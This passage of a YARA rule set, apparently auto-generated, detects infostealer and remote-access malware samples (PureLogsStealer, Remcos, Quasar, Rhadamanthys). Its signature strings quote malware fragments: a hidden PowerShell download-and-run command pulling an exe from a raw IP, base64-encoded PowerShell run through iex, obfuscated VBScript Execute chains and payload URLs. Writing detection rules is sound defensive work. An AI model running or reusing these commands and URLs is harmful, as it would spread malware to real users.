      $s13 = "add_InvokeRequested" fullword ascii /* score: '8.00'*/
      $s14 = "remove_InvokeRequested" fullword ascii /* score: '8.00'*/
      $s15 = "startasset" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6c782830 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6c782830.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6c782830dd3979c4aaa31532f8dc06e3fc979bbd6517152500f8b77610d96d89"
   strings:
      $s1 = "Xhhgt.exe" fullword wide /* score: '22.00'*/
      $s2 = "ExecuteSelector" fullword ascii /* score: '18.00'*/
      $s3 = "FilterProcessor" fullword ascii /* score: '15.00'*/
      $s4 = "Xhhgt.Compression" fullword ascii /* score: '14.00'*/
      $s5 = "get_MaxDecompressedBytes" fullword ascii /* score: '12.00'*/
      $s6 = "get_Decrypted" fullword ascii /* score: '11.00'*/
      $s7 = "Xhhgt.DataStructures" fullword ascii /* score: '11.00'*/
      $s8 = "get_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
      $s9 = "Decompressed" fullword ascii /* score: '9.00'*/
      $s10 = "set_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
      $s11 = "get_Ozgvplsj" fullword ascii /* score: '9.00'*/
      $s12 = "SelectOperationalSelector" fullword ascii /* score: '9.00'*/
      $s13 = "TraverseSequentialTree" fullword ascii /* score: '9.00'*/
      $s14 = "TraverseAdaptableTree" fullword ascii /* score: '9.00'*/
      $s15 = "TraverseCustomTree" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__71d7aa50 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_71d7aa50.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "71d7aa50b2871567a23fa50a5d7d62e460c361a6644e74579ac93a8ed8e92aa8"
   strings:
      $s1 = "Sixugincqc.exe" fullword wide /* score: '22.00'*/
      $s2 = "compilerProcessorArray" fullword ascii /* score: '18.00'*/
      $s3 = "Sixugincqc.Compilers" fullword ascii /* score: '14.00'*/
      $s4 = "get_MaxDecompressedBytes" fullword ascii /* score: '12.00'*/
      $s5 = "MergeToken" fullword ascii /* score: '12.00'*/
      $s6 = "OptimizeOperationalCompiler" fullword ascii /* score: '12.00'*/
      $s7 = "get_Decrypted" fullword ascii /* score: '11.00'*/
      $s8 = "TokenizeLogicalCompiler" fullword ascii /* score: '11.00'*/
      $s9 = "TokenizeTransferableCompiler" fullword ascii /* score: '10.00'*/
      $s10 = "TokenizeCentralCompiler" fullword ascii /* score: '10.00'*/
      $s11 = "TokenizePassiveCompiler" fullword ascii /* score: '10.00'*/
      $s12 = "TokenizeDynamicCompiler" fullword ascii /* score: '10.00'*/
      $s13 = "ValidateConfigurableToken" fullword ascii /* score: '10.00'*/
      $s14 = "TokenizeInternalCompiler" fullword ascii /* score: '10.00'*/
      $s15 = "m_PortableCompiler" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule ResolverRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file ResolverRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f3a15fbaea9280b9b2c5cd1b2fe59bb7a5a71260306eb9dbeadb0c4bd3bebdbb"
   strings:
      $s1 = "Lwcoxhvqw.exe" fullword wide /* score: '22.00'*/
      $s2 = "ExecuteCommonTask" fullword ascii /* score: '21.00'*/
      $s3 = "ExecutePassiveTask" fullword ascii /* score: '21.00'*/
      $s4 = "ExecuteRemoteTask" fullword ascii /* score: '21.00'*/
      $s5 = "ExecuteIdentifiableTask" fullword ascii /* score: '21.00'*/
      $s6 = "ExecuteGeneralTask" fullword ascii /* score: '18.00'*/
      $s7 = "ExecuteActiveTask" fullword ascii /* score: '18.00'*/
      $s8 = "ExecuteDetailedTask" fullword ascii /* score: '18.00'*/
      $s9 = "ExecuteControllableTask" fullword ascii /* score: '18.00'*/
      $s10 = "SynchronizeCentralExecutor" fullword ascii /* score: '16.00'*/
      $s11 = "loggerContext" fullword ascii /* score: '14.00'*/
      $s12 = "m_WatcherEncryptor" fullword ascii /* score: '14.00'*/
      $s13 = "get_MaxDecompressedBytes" fullword ascii /* score: '12.00'*/
      $s14 = "get_Decrypted" fullword ascii /* score: '11.00'*/
      $s15 = "get_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d6ab2734 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d6ab2734.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d6ab27346a83092e10313385a4456e5bd1c56eb046be6eb6bbea40b5c28e8c20"
   strings:
      $s1 = "https://stacysublett.com/wp-content/plugins/Gmqcoiflq.pdf" fullword wide /* score: '22.00'*/
      $s2 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s3 = "ExecuteSynchronousFlow" fullword ascii /* score: '18.00'*/
      $s4 = "ExecutionFlowController" fullword ascii /* score: '16.00'*/
      $s5 = "NEW ONE.exe" fullword wide /* score: '16.00'*/
      $s6 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s7 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s8 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
      $s9 = "encryptionIv" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3050a520 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3050a520.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3050a5206d0847d5cfa16e79944ce348db688294e311db4d7b6045ffbe337450"
   strings:
      $s1 = "Qgwwal.exe" fullword wide /* score: '22.00'*/
      $s2 = "m_TokenizerExecutor" fullword ascii /* score: '19.00'*/
      $s3 = "EncryptEfficientDecryptor" fullword ascii /* score: '16.00'*/
      $s4 = "GetNextCommonEnumerator" fullword ascii /* score: '12.00'*/
      $s5 = "CloseOperationalConnection" fullword ascii /* score: '12.00'*/
      $s6 = "m_AutomatedConnectionContent" fullword ascii /* score: '12.00'*/
      $s7 = "get_MaxDecompressedBytes" fullword ascii /* score: '12.00'*/
      $s8 = "SetDecryptor" fullword ascii /* score: '11.00'*/
      $s9 = "m_DecryptorNode" fullword ascii /* score: '11.00'*/
      $s10 = "m_ContextDecryptor" fullword ascii /* score: '11.00'*/
      $s11 = "get_Decrypted" fullword ascii /* score: '11.00'*/
      $s12 = "ConnectPassiveConnection" fullword ascii /* score: '10.00'*/
      $s13 = "_ConnectionRecommenders" fullword ascii /* score: '10.00'*/
      $s14 = "Qgwwal.Threading" fullword ascii /* score: '10.00'*/
      $s15 = "LockReadableConnection" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ed641141 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ed641141.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ed641141bde4baf238710ead8205eeee5c3ac8095cb3cdc17afc4b35e90752a9"
   strings:
      $s1 = "Mqvglhohd.exe" fullword wide /* score: '22.00'*/
      $s2 = "m_EncryptorAnnotation" fullword ascii /* score: '14.00'*/
      $s3 = "get_MaxDecompressedBytes" fullword ascii /* score: '12.00'*/
      $s4 = "get_Decrypted" fullword ascii /* score: '11.00'*/
      $s5 = "_IdentifiableRecommenderElements" fullword ascii /* score: '10.00'*/
      $s6 = "get_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
      $s7 = "Decompressed" fullword ascii /* score: '9.00'*/
      $s8 = "set_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
      $s9 = "StoreOperationalDic" fullword ascii /* score: '9.00'*/
      $s10 = "get_Kgbbeyogq" fullword ascii /* score: '9.00'*/
      $s11 = "ManageTransferableDic" fullword ascii /* score: '9.00'*/
      $s12 = "InvokeRequested" fullword ascii /* score: '8.00'*/
      $s13 = "add_InvokeRequested" fullword ascii /* score: '8.00'*/
      $s14 = "remove_InvokeRequested" fullword ascii /* score: '8.00'*/
      $s15 = "numsetup" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9093c00d {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9093c00d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9093c00dccefc39a0e8b1dc1a7333ebf3a0ccf38371d646a036fcf03f64042be"
   strings:
      $s1 = "Albijp.exe" fullword wide /* score: '22.00'*/
      $s2 = "Albijp.Threading" fullword ascii /* score: '10.00'*/
      $s3 = "get_Bbcqwqesvap" fullword ascii /* score: '9.00'*/
      $s4 = "_OperationalSynchronizer" fullword ascii /* score: '9.00'*/
      $s5 = "InvokeVerifier" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4acfa270 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4acfa270.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4acfa270edde641597466e1b78f793f3a0a51358702cb9aa629861c3909e6f3f"
   strings:
      $s1 = "Dfynzsa.exe" fullword wide /* score: '22.00'*/
      $s2 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s3 = "ExecuteSynchronousFlow" fullword ascii /* score: '18.00'*/
      $s4 = "https://www.arcon.com.pe/Kshzcqns.mp3" fullword wide /* score: '17.00'*/
      $s5 = "ExecutionFlowController" fullword ascii /* score: '16.00'*/
      $s6 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s7 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s8 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
      $s9 = "encryptionIv" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__ce7b88f8 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_ce7b88f8.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ce7b88f87f73313d63a4cbf1b8d238615a5b58eb81b97544f0b6a2e92327b410"
   strings:
      $s1 = "Sandbox.exe" fullword wide /* score: '22.00'*/
      $s2 = "x/getwltsva\\u$" fullword ascii /* score: '9.00'*/
      $s3 = "2:.;+_D~%" fullword ascii /* score: '9.00'*/ /* hex encoded string '-' */
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__0b2ddb84 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_0b2ddb84.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0b2ddb84a655024f37729c5a998d065f4b3f88bd3de2784025dc245104fbc752"
   strings:
      $s1 = "/dumps9taw" fullword ascii /* score: '14.00'*/
      $s2 = "\"3\",8\"" fullword ascii /* score: '9.00'*/ /* hex encoded string '8' */
      $s3 = "/logstrauu" fullword ascii /* score: '9.00'*/
      $s4 = "/getw:ls;a:u" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule PureLogsStealer_signature__7 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1b3c1bf3bfe8ead41173db5fd73a4c1dedda9018f75d8c6be0f33b930b41d278"
   strings:
      $x1 = "powershell.exe -ep bypass -Command Invoke-WebRequest -Uri \"http://193.23.199.155/111.exe\" -OutFile \"$env:temp\\LNKBUILD.bat\"" ascii /* score: '62.00'*/
      $x2 = "powershell.exe -ep bypass -Command Invoke-WebRequest -Uri \"http://193.23.199.155/111.exe\" -OutFile \"$env:temp\\LNKBUILD.bat\"" ascii /* score: '54.00'*/
      $x3 = "rt-Process -FilePath \"$env:temp\\LNKBUILD.bat\" -WindowStyle Hidden" fullword ascii /* score: '37.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 1KB and
      1 of ($x*)
}

rule QuasarRAT_signature_ {
   meta:
      description = "_subset_batch - file QuasarRAT(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ab0db8617b8ef8f21bc1c4c2daed70a3da5b7989e61a745e54ff9017a723f1f5"
   strings:
      $x1 = "=powershell -Command \"Start-Process powershell -WindowStyle Hidden -ArgumentL" fullword ascii /* score: '33.00'*/
      $s2 = "=ist '-Command \\\"$ddsdgo = ''WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUA" fullword ascii /* score: '16.00'*/
      $s3 = "=PQAgACQAaQBtAGEAZwBlAFQAZQB4AHQALgBJAG4AZABlAHgATwBmACgAJABlAG4AZAB" fullword ascii /* base64 encoded string '=   $ i m a g e T e x t . I n d e x O f ( $ e n d ' */ /* score: '14.00'*/
      $s4 = "=ACgAJwB0AHgAdAAuAHAAbQBBAGEAcgBiAGYALwBuAGkAYQBtAC8AcwBkAGEA" fullword ascii /* base64 encoded string ' ( ' t x t . p m A a r b f / n i a m / s d a ' */ /* score: '14.00'*/
      $s5 = "=ZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgB" fullword ascii /* base64 encoded string 'e m . C o n v e r t ] : : F r o m B a s e 6 4 S t r i n ' */ /* score: '14.00'*/
      $s6 = "=A=='';$oWjuxd = [system.Text.encoding]::Unicode.GetString^([system" fullword ascii /* score: '12.00'*/
      $s7 = "=ADQAQwBvAG0AbQBhAG4AZAAgAD0AIAAkAGkAbQBhAGcAZQBUAGUAeAB0AC4AUwB" fullword ascii /* base64 encoded string ' 4 C o m m a n d   =   $ i m a g e T e x t . S ' */ /* score: '10.00'*/
      $s8 = "ACcAeAA4AD" ascii /* base64 encoded string ' ' x 8 ' */ /* score: '10.00'*/
      $s9 = "=IAAgACAAIAAkAGwAZgBzAGQAZgBzAGQAZwAgAD0AIAAgACQAQgB5AHQAZQBzACAAKwAkAEIAeQB0AGU" fullword ascii /* base64 encoded string '        $ l f s d f s d g   =     $ B y t e s   + $ B y t e' */ /* score: '10.00'*/
      $s10 = "=YQAnACkALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsACAAWwBvAGIAagBlAGMAdABbAF0AXQAg" fullword ascii /* base64 encoded string 'a ' ) . I n v o k e ( $ n u l l ,   [ o b j e c t [ ] ]  ' */ /* score: '10.00'*/
      $s11 = "=.convert]::Frombase64string^($ddsdgo.replace^(''d@'',''r''^)^)^);iex $OWjuxD" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 50KB and
      1 of ($x*) and all of them
}

rule PureLogsStealer_signature__8 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d2914bd5f143b6355299bf062b64367d1c2312730c1ce579f75b8e78b3212db9"
   strings:
      $s1 = " F /cOb$/z%*FqG+,,wf+,Os~f{c9q~s1 ;1vl,+9lfF++yF$*Z1w%fAZFc%lGz/&R!1A2G3X+ vOf w,ZA/fc;%W*qbT$Zcov20vW*/0W !{)G*9,ZfAcqwGw swF++" wide /* score: '16.00'*/
      $s2 = "*y1~ 92%8%GFvO*f8Z$,zb1fzFG+{!w2GG{TG+2RA3f91Z TczXA8Zf{8,v9fGc$%A3~,TZ!;,A~&WXZz!X%lF)/;!Zz0vw2Alf{2y,ZZ32{+;2qczXfG&$oZZff1w,9" wide /* score: '16.00'*/
      $s3 = ",F0Ayf+$2 GXTZ*fFZ1RZTw*FG,A!RoG~s{bw fqR&*F/GFb*;/q%8szcXFTf8 Tc~1b8bq$~!F{9W&o2lqAF/+ WF2O,yTGwf0cy*/1RF2W0,zbF~39Z8 ;v{Z$X~f$" wide /* score: '16.00'*/
      $s4 = "F 8GF+ Z{2Z f&~G11Gs zos2%vz$3!wAwc3vq$zA3,8q yf$9R!%+T;v{Gw3AAXGfO&,2GO328%3*;*1{8* F0 ;ccRX+G~GZvq!o/yZ/2GX Fv+{AvGf+G 9sGf;vT" wide /* score: '16.00'*/
      $s5 = "w%$R*+sb2%Gff+Z1c+ {{Av2Go22Z 8fXvW&Ws1 /XO%9%y{,+v1o+b*90G29%~1yf$w,~222G29&lb/cR T0~*vRf%wv%W/+*~!W!{%/*~!XZR0fA," fullword wide /* score: '16.00'*/
      $s6 = ",2+8 /Z28&s8vl$*l TZ+v3oOv,FXfAsAR++%8 2 /bXql&3*G{,2!11z  Xq;s0sW3+cqR!GFfFF2/*8Z$&OZo0A%bRfF+vFl)q,OFwF0vfX;2$bR*%FFqf; A3/F2$" wide /* score: '16.00'*/
      $s7 = "0Rv)*zT*+Zq*+*2f++ /b8)AG9F&zG!Z G{v8%)A+FfT+Gf8{F~AFZ$*%lfF%T,X*w&Xv+f&+ZT3O,%$)Ws{2~++s0RcO*sw&G1FRbXb;*X9lFv;TFyGfWq9 G%Z29AT" wide /* score: '16.00'*/
      $s8 = "s2 TfZ )/w&!+3vAF*;0Xcyv+ X!TfFfqFlX*8c0XA bTT8bo 2TRA/F Ovc+ RqsGF1%2f3+W&cy1!F!sWf/vFvwv*2/oR%0AOqGRsq$y c1fZA3*Z1~,3G!;Gbl GT" wide /* score: '14.50'*/
      $s9 = "T; c;fb8v&y$X!ZZ~ /G+flb+ ~+f8,**;GFofW2osl+Fb$Gvl%v;c++ 823&W29fG!fl)bG vW//ZWZWb1&/TyvoG+{AzF+f+&vf/A *fw);%{y!;,vRsATsl*{FR!f" wide /* score: '14.50'*/
      $s10 = "fAb*y* y*!w/fsAbZ2TvoT2vT,y3*;fqoAvbo/AF/cz+OF$FA~%s;!G*fGG/vl2T$;,&~T!G Gyo3,Z2Z!" fullword wide /* score: '13.50'*/
      $s11 = "3Ab )XR $2G{8cTybOv +28TA~%)Z+!)9~A%2/v; sF*9*~bzG1fo9A2/!;9AZA*fWbZX+W2{!y/;G0yc+G*8cz1A8 {AGZo+z,*z0b2*%FXfsFcy%+Z9qZ*)*Rqcz2*" wide /* score: '13.00'*/
      $s12 = "GfTw&1&F$fFfX/F!f)3F,{cz1RA0O&y2!2FA*,z%+fR oqRf!W/%l*FZfqAyblG{29+G** RqFZZT*Z!*03zvXf~$;A{G%ws&Fv+Xv~%3A2Z{+ZZvWTFR2s80fAOsAv3" wide /* score: '13.00'*/
      $s13 = "yssTTOvos89;%+ybW&AF R$FG o 2G19yAb2TZOAGW*{FO&~f)20fR2fZFqFAs$$w ZooOcoFloGv{+,~c,2cG0c2%3v;ff{2c!y*!8228TXcOGRs* 31ZA)s;9,z2X0" wide /* score: '13.00'*/
      $s14 = "b~v/{zA*{9Wc1fw)Fs3;sZ%bz!R)GR21bRF1qwbsloGF&,8//FAFw,* 1+GG9fWo,+F*/8A%o" fullword wide /* score: '13.00'*/
      $s15 = "&+fR&+2 2!&Z&ZfF2Ff!2!fT2!&lfF2!&ZfT&Z&Z&TcffZ&T&ZfF2!fT2&&ff8cq&yf+&T2!2!cy&y*F2!*F2!fT2!&Zf!2 &2f0&y&y&T&TfZ&T&Z* 2!fTWc&TfZ&q" wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 9000KB and
      8 of them
}

rule PureLogsStealer_signature__9 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6df354981552b3505008feae94310200903ebb9c0bf03ddae90a6152cbac9203"
   strings:
      $s1 = "https://getabre.com/ZHQMcp" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and
      all of them
}

rule PureLogsStealer_signature__3ecb1d62 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_3ecb1d62.xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3ecb1d620532496d17d8249673cfe55d857d4ec7c0a6bf784b7024a5ed71db63"
   strings:
      $s1 = "https://getabre.com/VRyrXm" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and
      all of them
}

rule RemcosRAT_signature__f6bd0425 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f6bd0425.xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f6bd04259ef34c44a5c2057f2ea685c069ac65206b40c0b4bb6b1392cb7e0b26"
   strings:
      $s1 = "https://getabre.com/I4ASQN" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and
      all of them
}

rule PureLogsStealer_signature__2a637f3a {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_2a637f3a.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2a637f3ae45967c2dee0b76b05c586900d55afc3ba60f5f243c6d47cef93f499"
   strings:
      $x1 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null, 48));" fullword ascii /* score: '34.00'*/
      $s2 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48));" fullword ascii /* score: '30.00'*/
      $s3 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48));" fullword ascii /* score: '30.00'*/
      $s4 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48));" fullword ascii /* score: '29.00'*/
      $s5 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_OperatingSystem\", null, 48));" fullword ascii /* score: '27.00'*/
      $s6 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s7 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", null, 48));" fullword ascii /* score: '27.00'*/
      $s8 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_Processor\", null, 48));" fullword ascii /* score: '27.00'*/
      $s9 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_NTLogEvent\", null, 48));" fullword ascii /* score: '27.00'*/
      $s10 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_PrinterDriver\", null, 48));" fullword ascii /* score: '25.00'*/
      $s11 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '25.00'*/
      $s12 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null, 48));" fullword ascii /* score: '25.00'*/
      $s13 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_DisplayControllerConfiguration\", null, 48));" ascii /* score: '25.00'*/
      $s14 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_DriverForDevice\", null, 48));" fullword ascii /* score: '25.00'*/
      $s15 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_NetworkAdapterConfiguration\", null, 48));" fullword ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule PureLogsStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash_ {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0061ce9b2c47be7b5bef75b327ac5a247cbc494ebfee0983df2e308f629da27c"
   strings:
      $s1 = "7BNt9BNt7BNtbBNt5BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNtbBNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt" ascii /* score: '11.00'*/
      $s2 = "7BNt9BNt7BNtbBNt5BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNtbBNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt9BNt" ascii /* score: '11.00'*/
      $s3 = "    processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s4 = "        processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s5 = "\\/&5\"a~" fullword ascii /* score: '10.00'*/ /* hex encoded string 'Z' */
      $s6 = "4]\\-'7[=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'G' */
      $s7 = "* ' T/L" fullword ascii /* score: '9.00'*/
      $s8 = "ogbsovjw" fullword ascii /* score: '8.00'*/
      $s9 = "vudsxdqv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule PureLogsStealer_signature__dbbe144e {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_dbbe144e.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dbbe144e3eebad2d53ad44627b84dcb3001aba4cb3d897b058a68f47b1619c84"
   strings:
      $x1 = "' x4e92ZtqTir+UU03GuDEu+egzbsTdNB/fKQrObhGt6esu+cQyMqBAYbyE8lRoRgEWU+pvA7E4FK3PVz3PhVxt5mli174tPIdHss1IWAGLtuLJ99pnfuY6NuVWIttis" ascii /* score: '62.00'*/
      $s2 = "OLqsFbXWIqaczlovF9gwBbCirchkgXp0CKf7WwHGuK2NqboazRzQ14wYrBa3RfHs3au8LoI3kadAOA0d2teU1gWsoW4uFUij0cZMS9VTzMKmHn1WGpobRhgCyoUPswyk" ascii /* score: '21.00'*/
      $s3 = "K0pko7CG5d+zyvo/dtVbhvRVPAO5wycMdTOoOJERSz415m9Ez4+fhaD3YDxtQP16ym+IedEHA1gTaC6M3r0+kn/L+ZBmFrdktaZiwmL6nzQ2PW4xmNFtPtMXIVdhEqbz" ascii /* score: '19.00'*/
      $s4 = "REM H4sI@@@@@@@E@O18B5xU1fX/nZ3dZWkruyxN@Z9gQZTltZl5D0FpCy69LM0G97VlZHdnmZkloI5i/xk1YolRDCoaE1vU2@3BXhM1yU+TqLFgBIOCBUQ6vP/33Jl5" ascii /* score: '19.00'*/
      $s5 = "sFxKRxFENDj6PGa4z0Y+1H8a2WKeyENzBZxyn9aXByxa1dqp7U8uuFySzdTQobM1pKt89ryAs/gYx0F00ZRSYzVKXel7lPc/7CEWC/puolPpTOs7KhBv2hHSkRX9qebI" ascii /* score: '19.00'*/
      $s6 = "Execute chr(-118+CLng(&HBA))&chr(CLng(&H17E1)-6008)&chr(-9498+CLng(&H2587))&chr(-1169+CLng(&H4B1))&chr(242765/CLng(&H83F))&chr(C" ascii /* score: '19.00'*/
      $s7 = "3s4iH4ZsGG89AvwVitEmp98AF/BBZfV8v8ZvJdhOUEWZHmUS18FbzD1lgSpSYOHokkjUslrELGjYtW+//PKW7rKmjGx8A8AdpEuy2+TLKk7UhpOPeZ3q1PH8SiJhm99K" ascii /* score: '18.00'*/
      $s8 = "Execute chr(-118+CLng(&HBA))&chr(CLng(&H17E1)-6008)&chr(-9498+CLng(&H2587))&chr(-1169+CLng(&H4B1))&chr(242765/CLng(&H83F))&chr(C" ascii /* score: '18.00'*/
      $s9 = "RC3jhZSvPXo+BxF47/v79aVKvxRXn+LyjqgV/fd/AZyADErNgNmTvm4I1uiLicy5N+gjcJOsbrQ64Qb8mT9yzvV0+NOhLnTbpvC2TrkKdwTbXMYfS5EI062Gkp/SpyUu" ascii /* score: '16.00'*/
      $s10 = "X/veMQHKBzamWOckqqhslDzHQ++AaCIbPgJiHQuf1Q7qidllwB7J0l/T9uhyPQo68L7ajqXwmufZswMPZ+o7FoPYSiDe9sQuDXGPvHFJqPEIJxxctUZo6e7hnB0bunpl" ascii /* score: '16.00'*/
